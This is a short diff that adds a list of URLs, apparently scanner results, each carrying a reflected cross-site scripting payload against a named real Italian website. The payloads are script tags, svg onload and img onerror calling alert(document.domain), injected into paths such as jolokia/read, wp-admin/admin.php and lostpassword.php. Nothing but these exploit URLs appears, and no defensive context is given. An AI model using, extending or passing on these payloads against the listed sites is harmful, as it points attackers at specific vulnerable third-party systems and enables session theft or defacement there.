@@ -1,0 +1,9 @@
+http://albertoguerra.it/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://alfa-romeo.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://allgo.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://arwio.it/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://asmecal.it/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+http://asusroma.it/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+http://attivazioni.ntmobile.it/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://am.lucyon.it/secure/ConfigurePortalPages!default.jspa?Search=Search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&view=search
+https://asem.it/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
